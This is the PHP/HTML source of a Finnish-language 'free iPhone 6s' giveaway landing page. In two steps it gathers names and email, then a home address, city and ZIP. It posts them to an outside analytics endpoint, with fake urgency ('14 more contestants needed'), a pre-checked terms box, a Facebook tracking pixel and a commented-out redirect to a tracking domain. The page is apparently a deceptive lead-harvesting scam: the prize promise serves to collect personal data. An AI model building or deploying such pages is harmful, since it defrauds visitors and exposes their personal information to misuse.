
<?php

if (!isset($_GET['confirm'])){
?>
	<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0'/>

	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
	<meta name="description" content="">
	<meta name="author" content="">
	<link rel="icon" href="../../favicon.ico">

	<title>iPhone 6S</title>

	<!-- Latest compiled and minified CSS -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">

	<!-- Custom styles for this template -->
	<link href="https://landing.quizawards.com/assets/iphone6s/css/iphone6s-template.css?v=1449487455" rel="stylesheet">
<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,600,600italic,700,800,800italic,700italic,300,300italic&subset=latin,greek-ext,greek,vietnamese,cyrillic-ext,latin-ext,cyrillic' rel='stylesheet' type='text/css'>
	
	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->
	<style>
	html, body, p,span,h1,h2,h3,h4,h5,h6, a,div {
		font-family: 'Open Sans', sans-serif !important;
	}
		@media only screen and (min-width: 768px){
.subform {
    font-size: 15px;
}}

		@media (max-width: 768px){
			.stripe-sm{    background-size: 200% !Important;}
			}
			.description-title {
    font-size: 28px;
}
.form-group input, select {
    background: #02131f;
    color: #333333;
    padding: 0 15px;
    font-weight: 600;
    font-size: 13px;
    background: rgb(255, 255, 255);
}
.btn-green {
    color:white;
	    font-size: 1.7rem;
	        text-transform: none;
}
@media only screen and (min-width: 910px){
.section-2 {
    background-position-y: 20px;
    background-position-x: 130%;
    background-repeat: no-repeat;
    background-color: #f2f2f2;
    background-size: 60%;
}}
@media (max-width: 768px){
.section-2 {    background-size: 66%;
    background-position-y: 38px;
   }
}
@media (max-width: 910px){
.section-2 {
    background-position-y: 40px;
    background-position-x: 130%;
    background-repeat: no-repeat;
    background-color: #f2f2f2;
    background-size: 60%;
}}
@media (max-width: 440px){.description-title {font-size: 18px;}.btn-green {font-size: 1.8rem;}.btn-arrow {
    position: absolute;
    top: 15px;
    left: -4px;
    width: 40px;
    height: 29px;
}}
@media (max-width: 1197px){
.btn-green {
    font-size: 1.9rem;
}}
@media (max-width: 440px){
	
.btn-green {
    font-size: 1.6rem;
}}

@media (max-width: 480px){
	.btn-arrow {
    position: absolute;
    top: 17px;
    left: -4px;
    width: 40px;
    height: 29px;
}
}
	</style>
	
		</head>
<body>
	<div class="section-1">
		<div class="container">
			<div class="row">
				<div class="col-xs-12">
					<h1 class="title-lg">Saa upouusi </h1>
					<div class="iphone-logo"></div>
					<h1 class="title-lg">ILMAISEKSI</h1>
				</div>
				
				<div class="col-xs-12 col-md-8">
					<div class="iphone-price-tag">
						<!--<div class="price-value">ONLY <span>$1</span></div>-->
						<img src="http://wetestproducts.com/au.png"/>
					</div>
					
					<!-- iphone specs -->
					<div class="row iphone-specs">
						<!--<div class="col-xs-1"></div>-->
						<div class="col-xs-6">
							<div class="row">
								<div class="col-xs-12 spec-lg">4.7"</div>
								<div class="col-xs-12 spec-sm">Retina HD näyttö 3D Touch-ominaisuudella</div>
							</div>
						</div>
						<div class="col-xs-6">
							<div class="row right-specs">
								<div class="col-xs-12 spec-lg">1334x750</div>
								<div class="col-xs-12 spec-sm">Resoluutio</div>
							</div>
						</div>
						<!--<div class="col-xs-1"></div>-->
					</div>
					<!-- specs -->
				</div>
				<div class="col-xs-12 col-md-4 c-form">
					<div class="stripe-sm"></div>
					<div class="row-">
						<div class="form-content col-xs-12">
							<form method="POST" id="sendData">
							<div class="row">
								<div class="col-xs-1"></div>
								<div class="col-xs-10 col-md-12">
									<h4 class="form-title">Minne Lähetämme Uuden</br>iPhone 6s:si?</h3>
										<div class="form-group">
											<input autocomplete="off" type="text" class="form-control" name="firstname"  placeholder="Etunimi" required>
											<p style="color:red" class="help-block-email"></p>
										</div>
										<div class="form-group">
                                            <input autocomplete="off" type="text" class="form-control" name="lastname" placeholder="Sukunimi" required>
                                            <p style="color:red" class="help-block-fname"></p>
										</div>
										<div class="form-group">
                                            <input autocomplete="off" type="email" class="form-control" name="email"  placeholder="Sähköposti" required>
                                            <p style="color:red" class="help-block-lname"></p>
										</div>
								</div>
								<div class="col-xs-1"></div>
							</div>
							</form>
							<div class="row">
								<div class="submit-btn">
									<input type="hidden" name="lang" value="en" />
									<input type="hidden" name="page" value="iphone6s" />
									<input type="hidden" name="gift_choice" value="iphone6s" />
									<button id="countMe" class="btn-block btn-green">
										<div class="btn-arrow"><img src="//landing.quizawards.com/assets/iphone6s/graphics/arrow.png?v=1449487455"></div>
										Lähettäkää iPhone 6s:ni								</button>
								</div>
							</div>
							<div class="row">
							<div class="accept-terms">
								<div class="form-bottom">
									<div class="checkbox">
										<label><input type="checkbox" name="cgu" class="checkname" value="1" required="required" checked="checked"> Hyväksyn  <a href="http://wetestproducts.com/iphone6s/au/terms.php" target="_BLANK">Käyttöehdot</a></label>
									</div>
								</div>
							</div>
							</div>
							
						</div>
						
					</div>
					<div class="row">
						<div class="col-xs-1 col-sm-2"></div>
						<div class="col-xs-10 col-sm-8 col-md-12 subform">
						Osallistu kilpailuun saadaksesi upouuden iPhone&nbsp;6s:n						</div>
						<div class="col-xs-1 col-sm-2"></div>
					</div>
				</div> <!-- form div -->
				
			</div>
			
		</div><!-- /.container -->
	</div>
	
	<div class="section-2">
		<div class="stripe-lg"></div>
			<div class="container" style="    padding: 0;">
				<div class="row">
						
					<div class="col-xs-11 col-xs-offset-1 col-md-12 col-sm-offset-0">
						<h2 class="title-md description-title text-left">Kokemus, joka on erilainen kuin yksikään muu.</br>Puhelimella, joka on erilainen kuin yksikään muu.					</h2>
					</div>
					<div class="col-xs-10 col-xs-offset-1 col-sm-offset-0 col-sm-6">
						
						<div class="description-text">
							<p class="text-left">
							iOS 9 on suuri syy sille, ettet löydä mitään vastaavaa kuin iPhone. Se saattaa yhteen hienostuneen ja intuitiivisen käyttöliittymän, voimakkaat ominaisuudet ja jykevän turvallisuuden. Se on suunniteltu toimimaan yhtä kauniisti kuin miltä se näyttää. Näin voit nauttia kaikesta mitä teet — laitteella joka
							</p>
						</div>
					</div>
				<div class="col-sm-6 hidden-xs"></div>				
		

				</div>
			</div>
		<div class="stripe-lg"></div>
	</div>

	<div class="section-3">
		<div class="container">
			<div class="row">
				<div class="col-xs-12">
					<h2 class="title-md description-title">Innovaatio 3D Touchin takana.</h2>
					<div class="description-text col-sm-8 col-sm-offset-2">
						<p>
							
							3D Touchin käyttäminen tehdäksesi enemmän iPhonellasi on niin yksinkertaista kuin näytön painaminen. Mutta se, mitä tapahtuu pinnan alla on hienostunut prosessi. Tarjotakseen vivahteikkaan efektin asteittaisesta voiman käytöstä, 3D Touch havaitsee dynaamisen skaalan painetta mikroskooppiselle ateelle. Se huomioi jopa muutokset
							</p>
					</div>
					<div class="iphone-disassembled">
						<img src="//landing.quizawards.com/assets/iphone6s/graphics/disassembled-iphone.jpg?v=1449487455"/>
					</div>
					
				</div>
			</div>
		</div>
	</div>

	<div class="section-5">
		<div class="cta">
			<h2 class="title-md cta-title">Mitä odotat?</h2>
			<div class="cta-count">
			Tarvitsemme <span>14</span> kilpailijaa lisää.		</div>
			<div class="submit-btn">
				<button type="button" class="btn-block btn-green " onclick="submitForm()">
					<div class="btn-arrow"><img src="//landing.quizawards.com/assets/iphone6s/graphics/arrow.png?v=1449487455"></div>
					Lähettäkää iPhone 6s:ni			</button>
			</div>
		</div>
		
	</div>

	

	<!-- Bootstrap core JavaScript
	================================================== -->
	<!-- Placed at the end of the document so the pages load faster -->
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
	<!-- Latest compiled and minified JavaScript -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<script src="<?php echo base_url()?>leads_assets/assets/is.js"></script>
<script>
	function submitForm(){
			 $("html, body").animate({ scrollTop: 0 }, 600);
   			return false;
		}
	$(document).ready(function(){
	
		function apiRun(form){
			form.push({"name":'lang','value': window.location.pathname.split('/')[2]});
			$.ajax({
				type: 'POST',
				url: 'http://wetestproducts.com/analytics/fb_call',
				data: form,
				dataType:'json',
				success: function(resp){
					if(resp){
						window.location.href="http://wetestproducts.com/iphone6s/fi?confirm";
					}else{
						alert('Please check your details');
					}
				}
			});
		}
		$('#countMe').on('click',function(){
			var form = $('#sendData').serializeArray();
			
			var email = is.email($('input[name="email"]').val());
			var fname = is.not.empty($('input[name="firstname"]').val());
			var lname = is.not.empty($('input[name="lastname"]').val());
			if(email && fname && lname){
				apiRun(form);
			}else{
				
				if(!email){
					$('.help-block-email').html('Field is required');	
					setTimeout(function(){$('.help-block-email').html('');},2500);
				}
				if(!fname){
					$('.help-block-fname').html('Field is required');
					setTimeout(function(){$('.help-block-fname').html('');},2500);	
				}
				if(!lname){
					$('.help-block-lname').html('Field is required');	
					setTimeout(function(){$('.help-block-lname').html('');},2500);
				}
				console.log(email ,fname ,lname);
			}
			
		});
	});
</script>


</body>
</html>
<?php }else{?>
	
	<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0'/>

	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
	<meta name="description" content="">
	<meta name="author" content="">
	<link rel="icon" href="../../favicon.ico">

	<title>iPhone 6S</title>

	<!-- Latest compiled and minified CSS -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">

	<!-- Custom styles for this template -->
	<link href="https://landing.quizawards.com/assets/iphone6s/css/iphone6s-template.css?v=1449487455" rel="stylesheet">
<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,600,600italic,700,800,800italic,700italic,300,300italic&subset=latin,greek-ext,greek,vietnamese,cyrillic-ext,latin-ext,cyrillic' rel='stylesheet' type='text/css'>
	
	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->
	<style>
	html, body, p,span,h1,h2,h3,h4,h5,h6, a,div {
		font-family: 'Open Sans', sans-serif !important;
	}
		@media only screen and (min-width: 768px){
.subform {
    font-size: 15px;
}}

		@media (max-width: 768px){
			.stripe-sm{    background-size: 200% !Important;}
			}
			.description-title {
    font-size: 28px;
}
.form-group input, select {
    background: #02131f;
    color: #fff;
    padding: 0 15px;
    font-weight: 600;
    font-size: 13px;
  
}
.btn-green {
    color:white;
	    font-size: 2rem;
	        text-transform: none;
}
@media only screen and (min-width: 910px){
.section-2 {
    background-position-y: 20px;
    background-position-x: 130%;
    background-repeat: no-repeat;
    background-color: #f2f2f2;
    background-size: 60%;
}}
@media (max-width: 768px){
.section-2 {    background-size: 66%;
    background-position-y: 38px;
   }
}
@media (max-width: 910px){
.section-2 {
    background-position-y: 40px;
    background-position-x: 130%;
    background-repeat: no-repeat;
    background-color: #f2f2f2;
    background-size: 60%;
}}
@media (max-width: 440px){.description-title {font-size: 18px;}.btn-green {font-size: 1.8rem;}.btn-arrow {
    position: absolute;
    top: 15px;
    left: -4px;
    width: 40px;
    height: 29px;
}}
@media (max-width: 1197px){
.btn-green {
    font-size: 1.9rem;
}}
@media (max-width: 440px){
	
.btn-green {
    font-size: 1.6rem;
}}

@media (max-width: 480px){
	.btn-arrow {
    position: absolute;
    top: 17px;
    left: -4px;
    width: 40px;
    height: 29px;
}
}
	</style>
	
		</head>
<body>
	<div class="section-1" style="padding-bottom: 0;margin-bottom:0">
		<div class="container">
			<div class="row" style="    margin-top: 2em;">
				<div class="col-xs-12">
					<h1 style="text-align: center;color: white;font-weight: 300;">Enter Your Address Below For Delivery</h1>
					
				</div>
				
				<div class="col-xs-12 col-md-6">
					<div style="text-align: right">
						<!--<div class="price-value">ONLY <span>$1</span></div>-->
					<img src="http://wetestproducts.com/leads_assets/assets/product.png" style="    width: auto;"/>	
					</div>
					
					<!-- iphone specs -->
			
					<!-- specs -->
				</div>
				<div class="col-xs-12 col-md-4 c-form">
					<div class="stripe-sm"></div>
					<div class="row-">
						<div class="form-content col-xs-12">
							<form method="POST" id="sendData">
							<div class="row">
								<div class="col-xs-1"></div>
								<div class="col-xs-10 col-md-12" style="    margin-bottom: 2em;">
									<h4 class="form-title">Where Should We Send Your New</br>iPhone 6s?</h3>
										<div style="background: #1e6076;width:100%;height:1px;margin-bottom:1em"></div>
										<div class="form-group">
											<input autocomplete="off" type="text" class="form-control" name="address"  placeholder="Address" required>
											<p style="color:red" class="help-block-email"></p>
										</div>
										<div class="form-group">
                                            <input autocomplete="off" type="text" class="form-control" name="city" placeholder="City" required>
                                            <p style="color:red" class="help-block-fname"></p>
										</div>
										<div class="form-group">
                                            <input autocomplete="off" type="email" class="form-control" name="zip"  placeholder="ZIP Code" required>
                                            <p style="color:red" class="help-block-lname"></p>
										</div>
								</div>
								<div class="col-xs-1"></div>
							</div>
							</form>
							<div class="row">
								<div class="submit-btn">
									<input type="hidden" name="lang" value="en" />
									<input type="hidden" name="page" value="iphone6s" />
									<input type="hidden" name="gift_choice" value="iphone6s" />
									<button id="countMe" class="btn-block btn-green" style="color:#2c2c2c">
										<div class="btn-arrow"><img src="//landing.quizawards.com/assets/iphone6s/graphics/arrow.png?v=1449487455"></div>
										TEST NEW iPhone 6S								</button>
								</div>
							</div>
							<div class="row">
							
							</div>
							
						</div>
						
					</div>
					
				</div> <!-- form div -->
				
			</div>
			
		</div><!-- /.container -->
	</div>
	
	<div class="section-2">
		<div class="stripe-lg"></div>
			<div class="container" style="    padding: 0;">
				<div class="row">
						
				
		

				</div>
			</div>
		<div class="stripe-lg"></div>
	</div>

	
	


	<!-- Bootstrap core JavaScript
	================================================== -->
	<!-- Placed at the end of the document so the pages load faster -->
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
	<!-- Latest compiled and minified JavaScript -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<script src="<?php echo base_url()?>leads_assets/assets/is.js"></script>
<script>
	
	<?php $this->session->userdata('userID');?>
	$(document).ready(function(){
	
		function apiRun(form){
			form.push({"name":'lang','value': window.location.pathname.split('/')[2]});
			$.ajax({
				type: 'POST',
				url: 'http://wetestproducts.com/analytics/fb_update',
				data: form,
				dataType:'json',
				success: function(resp){
					console.log(resp);
					if(resp.status){
						window.location.href="http://wetestproducts.com/iphone6s-thanks/fi";
						//window.location.href="http://wetestproducts.com/iphone6s/au/buffer.php";
					}else{
						alert('Please check your details');
					}
				}
			});
		}
		$('#countMe').on('click',function(){
			var form = $('#sendData').serializeArray();
			
			var address = is.not.empty($('input[name="address"]').val());
			var city = is.not.empty($('input[name="city"]').val());
			var zip = is.not.empty($('input[name="zip"]').val());
			if(address && city && zip){
				apiRun(form);
			}else{
				
				if(!address){
					$('.help-block-email').html('Field is required');	
					setTimeout(function(){$('.help-block-email').html('');},2500);
				}
				if(!city){
					$('.help-block-fname').html('Field is required');
					setTimeout(function(){$('.help-block-fname').html('');},2500);	
				}
				if(!zip){
					$('.help-block-lname').html('Field is required');	
					setTimeout(function(){$('.help-block-lname').html('');},2500);
				}
				
			}
			
		});
	});
</script>

<!-- Facebook Pixel Code -->
<script>
!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
document,'script','//connect.facebook.net/en_US/fbevents.js');

fbq('init', '295166023967402');
fbq('track', "PageView");</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=295166023967402&ev=PageView&noscript=1"
/></noscript>
<!-- End Facebook Pixel Code -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script>
	$( document ).ready(function(){
		// setTimeout(function(){
		// //window.location.href="http://javtrk03.com/tracking?src=5677f9f169a1ca6d74ad0050&s1=&s2=&s3=&s4=&s5=&k=56d03ba40d08319d59331e81";
		// },1000);
	});
</script>

</body>
</html>
<?php }?>